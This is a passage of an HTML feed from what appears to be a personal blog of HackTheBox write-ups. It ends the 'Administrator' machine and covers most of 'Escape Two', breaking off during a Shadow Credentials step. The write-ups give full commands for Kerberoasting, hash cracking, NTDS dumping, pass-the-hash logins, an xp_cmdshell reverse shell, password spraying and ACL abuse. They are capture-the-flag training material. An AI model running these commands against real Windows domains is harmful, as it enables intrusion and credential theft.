+data-flex-basis="917px"
+&gt;
+Use faketime to sync your time with the DC and targetedKerberoast to execute the attack
+&lt;a class="link" href="https://github.com/ShutdownRepo/targetedKerberoast" target="_blank" rel="noopener"
+&gt;https://github.com/ShutdownRepo/targetedKerberoast&lt;/a&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;faketime &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;ntpdate -q dc.administrator.htb &lt;span class="p"&gt;|&lt;/span&gt; grep -oP &lt;span class="s1"&gt;&amp;#39;\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}&amp;#39;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt; python targetedKerberoast.py -d &lt;span class="s2"&gt;&amp;#34;administrator.htb&amp;#34;&lt;/span&gt; -u &lt;span class="s2"&gt;&amp;#34;emily&amp;#34;&lt;/span&gt; -p &lt;span class="s2"&gt;&amp;#34;XXXXXXXXXXXXXXXXXXXXX&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;And crack the hash with john&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;john hash.txt --wordlist&lt;span class="o"&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Now that we have access to ethan&amp;rsquo;s account, we can dump the hashes for the administrator and obtain the root flag&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/htb-administrator-writeup/4.png"
+width="768"
+height="271"
+srcset="https://solarspectre.github.io/p/htb-administrator-writeup/4_hu_9a19eebed6ee0f32.png 480w, https://solarspectre.github.io/p/htb-administrator-writeup/4_hu_5a21c04038ef84d7.png 1024w"
+loading="lazy"
+alt="Image 4"
+class="gallery-image"
+data-flex-grow="283"
+data-flex-basis="680px"
+&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;nxc smb 192.168.1.100 -u ethan -p &lt;span class="s1"&gt;&amp;#39;XXXXXXXXXXXXXX&amp;#39;&lt;/span&gt; --ntds --users administrator
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Login with evil-winrm as administrator and get the flag&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;evil-winrm -i 10.10.11.42 -u administrator -H XXXXXXXXXXXXXXXXXXXXXXXXXX
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;*Evil-WinRM* PS C:&lt;span class="se"&gt;\U&lt;/span&gt;sers&lt;span class="se"&gt;\A&lt;/span&gt;dministrator&lt;span class="se"&gt;\D&lt;/span&gt;esktop&amp;gt; &lt;span class="nb"&gt;type&lt;/span&gt; root.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id="conclusion"&gt;Conclusion
+&lt;/h3&gt;&lt;p&gt;This machine covers topics like Kerberoasting, bloodhound, DCSync / Dump Hashes, GenericWrite, GenericAll,Password Cracking and Password Database leak&lt;/p&gt;
+&lt;p&gt;&lt;mark&gt;Hope you enjoy it and Happy Hacking!&lt;/mark&gt;&lt;/p&gt;</description></item><item><title>HTB Escape Two - Writeup</title><link>https://solarspectre.github.io/p/htb-escape-two-writeup/</link><pubDate>Mon, 17 Mar 2025 00:00:00 +0000</pubDate><guid>https://solarspectre.github.io/p/htb-escape-two-writeup/</guid><description>&lt;img src="https://solarspectre.github.io/p/htb-escape-two-writeup/cover.png" alt="Featured image of post HTB Escape Two - Writeup" /&gt;&lt;h3 id="enumeration"&gt;Enumeration
+&lt;/h3&gt;&lt;p&gt;Let&amp;rsquo;s start with a scan to all ports:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sudo nmap -sS -p- --open --min-rate &lt;span class="m"&gt;5000&lt;/span&gt; -vvv -n -Pn 10.10.11.51 -oG allPorts
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/htb-escape-two-writeup/1.png"
+width="408"
+height="503"
+srcset="https://solarspectre.github.io/p/htb-escape-two-writeup/1_hu_40439663a3a11e59.png 480w, https://solarspectre.github.io/p/htb-escape-two-writeup/1_hu_5c031bd46bfe2bbb.png 1024w"
+loading="lazy"
+alt="Image 1"
+class="gallery-image"
+data-flex-grow="81"
+data-flex-basis="194px"
+&gt;&lt;/p&gt;
+&lt;p&gt;once it&amp;rsquo;s finished, grep the ports and copy them to later scan them with nmap looking out for the versions of the services hosted.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; sudo nmap -sC -sV -p&amp;lt;ports&amp;gt; &amp;lt;ip&amp;gt; -oN targeted
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/htb-escape-two-writeup/2.png"
+width="486"
+height="554"
+srcset="https://solarspectre.github.io/p/htb-escape-two-writeup/2_hu_4ea4b4a3e291b08b.png 480w, https://solarspectre.github.io/p/htb-escape-two-writeup/2_hu_cb1c65a6350e6cd.png 1024w"
+loading="lazy"
+alt="Image 2"
+class="gallery-image"
+data-flex-grow="87"
+data-flex-basis="210px"
+&gt;&lt;/p&gt;
+&lt;p&gt;Add the domains from the scan to your /etc/hosts file&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;10.10.11.51 DC01.sequel.htb sequel.htb
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Well, taking a look at smb with smbclient using the credentials that HackTheBox gives us we can see the share names for this domain&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;smbclient -L 10.10.11.51 -U &lt;span class="s1"&gt;&amp;#39;rose&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/htb-escape-two-writeup/3.png"
+width="432"
+height="196"
+srcset="https://solarspectre.github.io/p/htb-escape-two-writeup/3_hu_fb652cce378ffe33.png 480w, https://solarspectre.github.io/p/htb-escape-two-writeup/3_hu_3c7baf155f4c4d54.png 1024w"
+loading="lazy"
+alt="Image 3"
+class="gallery-image"
+data-flex-grow="220"
+data-flex-basis="528px"
+&gt;&lt;/p&gt;
+&lt;p&gt;There&amp;rsquo;s a share called Accounting Department, list the contents of it&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;smbclient //10.10.11.51/Accounting&lt;span class="se"&gt;\ &lt;/span&gt;Department -U &lt;span class="s1"&gt;&amp;#39;rose&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;we can download the files hosted there&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;get accounts.xlsx
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;get accounting_2024.xlsx
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/htb-escape-two-writeup/4.png"
+width="604"
+height="192"
+srcset="https://solarspectre.github.io/p/htb-escape-two-writeup/4_hu_debf88636f03901.png 480w, https://solarspectre.github.io/p/htb-escape-two-writeup/4_hu_8b551d991e9b4e39.png 1024w"
+loading="lazy"
+alt="Image 4"
+class="gallery-image"
+data-flex-grow="314"
+data-flex-basis="755px"
+&gt;&lt;/p&gt;
+&lt;p&gt;You can see the contents of the accounts.xlsx file with &lt;a class="link" href="https://jumpshare.com/viewer/xlsx" target="_blank" rel="noopener"
+&gt;https://jumpshare.com/viewer/xlsx&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/htb-escape-two-writeup/6.png"
+width="541"
+height="183"
+srcset="https://solarspectre.github.io/p/htb-escape-two-writeup/6_hu_1983a143c9144cbd.png 480w, https://solarspectre.github.io/p/htb-escape-two-writeup/6_hu_5764122f881f44ff.png 1024w"
+loading="lazy"
+alt="Image 6"
+class="gallery-image"
+data-flex-grow="295"
+data-flex-basis="709px"
+&gt;&lt;/p&gt;
+&lt;h3 id="user-flag"&gt;User Flag
+&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;netexec mssql 10.10.11.51 -u sa -p &amp;lt;password&amp;gt; --local-auth -M mssql_priv
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Now we&amp;rsquo;ve found another user (sa) to continue enumerating&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/htb-escape-two-writeup/8.png"
+width="1001"
+height="91"
+srcset="https://solarspectre.github.io/p/htb-escape-two-writeup/8_hu_ea62eba353ee58c7.png 480w, https://solarspectre.github.io/p/htb-escape-two-writeup/8_hu_36fb689d16eb2ec7.png 1024w"
+loading="lazy"
+alt="Image 8"
+class="gallery-image"
+data-flex-grow="1100"
+data-flex-basis="2640px"
+&gt;&lt;/p&gt;
+&lt;p&gt;It&amp;rsquo;s a sysadmin, so we can get a reverse shell with xp_cmdshell in mssql, login to it using impacket mssqlclient&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;mssqlclient.py sa@10.10.11.51
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Enable xp_cmdshell with:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;span class="lnt"&gt;4
+&lt;/span&gt;&lt;span class="lnt"&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sp_configure &amp;#39;show advanced options&amp;#39;, 1;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;RECONFIGURE;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sp_configure &amp;#39;xp_cmdshell&amp;#39;, 1;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;RECONFIGURE;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Now execute the powershell reverse shell encoded in base64 with this, you can use &lt;a class="link" href="https://www.revshells.com/" target="_blank" rel="noopener"
+&gt;https://www.revshells.com/&lt;/a&gt;:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;EXEC xp_cmdshell &amp;#39;powershell -e [base64ReverseShell]&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/htb-escape-two-writeup/9.png"
+width="265"
+height="70"
+srcset="https://solarspectre.github.io/p/htb-escape-two-writeup/9_hu_d6da6f4e2812ee64.png 480w, https://solarspectre.github.io/p/htb-escape-two-writeup/9_hu_c26ef41205a3e6ff.png 1024w"
+loading="lazy"
+alt="Reverse Shell"
+class="gallery-image"
+data-flex-grow="378"
+data-flex-basis="908px"
+&gt;&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s start enumerating this machine, we can see a SQL2019 folder&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/htb-escape-two-writeup/10.png"
+width="557"
+height="414"
+srcset="https://solarspectre.github.io/p/htb-escape-two-writeup/10_hu_ae8de43dd281978b.png 480w, https://solarspectre.github.io/p/htb-escape-two-writeup/10_hu_b03f13de89061c22.png 1024w"
+loading="lazy"
+alt="Contents of C folder"
+class="gallery-image"
+data-flex-grow="134"
+data-flex-basis="322px"
+&gt;&lt;/p&gt;
+&lt;p&gt;there&amp;rsquo;s a file with credentials in ExpressAdv_ENU&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;cat sql-Configuration.INI
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Create a list with all the users and passwords you&amp;rsquo;ve found to do a password spraying attack and find any reused passwords&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;netexec smb 10.10.11.51 -u users.txt -p passwords.txt --continue-on-success
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/htb-escape-two-writeup/11.png"
+width="602"
+height="38"
+srcset="https://solarspectre.github.io/p/htb-escape-two-writeup/11_hu_444b58356db2cdbf.png 480w, https://solarspectre.github.io/p/htb-escape-two-writeup/11_hu_7657876816ab8ecb.png 1024w"
+loading="lazy"
+alt="Reused password"
+class="gallery-image"
+data-flex-grow="1584"
+data-flex-basis="3802px"
+&gt;&lt;/p&gt;
+&lt;p&gt;ryan and sql_svc have the same password, so we can login to ryan using evilwinrm&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;evil-winrm -i 10.10.11.51 -u ryan -p &amp;lt;password&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Now you can get the user flag
+&lt;img src="https://solarspectre.github.io/p/htb-escape-two-writeup/12.png"
+width="468"
+height="222"
+srcset="https://solarspectre.github.io/p/htb-escape-two-writeup/12_hu_896a3dc3a5e9cf73.png 480w, https://solarspectre.github.io/p/htb-escape-two-writeup/12_hu_e277f2b2225ef23f.png 1024w"
+loading="lazy"
+alt="User Flag"
+class="gallery-image"
+data-flex-grow="210"
+data-flex-basis="505px"
+&gt;&lt;/p&gt;
+&lt;h3 id="root-flag"&gt;Root Flag
+&lt;/h3&gt;&lt;p&gt;Using Bloodhound community edition we can find a path to Administrator using the credentials of ryan&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/htb-escape-two-writeup/19.png"
+width="1379"
+height="751"
+srcset="https://solarspectre.github.io/p/htb-escape-two-writeup/19_hu_4b34a6184971a1ef.png 480w, https://solarspectre.github.io/p/htb-escape-two-writeup/19_hu_802a634224f4fbf6.png 1024w"
+loading="lazy"
+alt="Write Owner"
+class="gallery-image"
+data-flex-grow="183"
+data-flex-basis="440px"
+&gt;&lt;/p&gt;
+&lt;p&gt;Set the owner of the ca_svc account to ryan&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;span class="lnt"&gt;4
+&lt;/span&gt;&lt;span class="lnt"&gt;5
+&lt;/span&gt;&lt;span class="lnt"&gt;6
+&lt;/span&gt;&lt;span class="lnt"&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;impacket-owneredit -action write -new-owner ryan -target ca_svc sequel.htb/ryan:WqSZAF6CysDQbGb3
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Current owner information below
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; - SID: S-1-5-21-548670397-972687484-3496335370-512
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; - sAMAccountName: Domain Admins
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; - distinguishedName: &lt;span class="nv"&gt;CN&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;Domain Admins,CN&lt;span class="o"&gt;=&lt;/span&gt;Users,DC&lt;span class="o"&gt;=&lt;/span&gt;sequel,DC&lt;span class="o"&gt;=&lt;/span&gt;htb
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; OwnerSid modified successfully!
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Grant Full Control Rights to ryan using DACL (Discretionary Access Control List) to escalate privileges&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;impacket-dacledit -action write -rights FullControl -principal ryan -target ca_svc sequel.htb/ryan:WqSZAF6CysDQbGb3
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; DACL backed up to dacledit-20250330-161623.bak
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; DACL modified successfully!
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Shadow Credentials attack&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
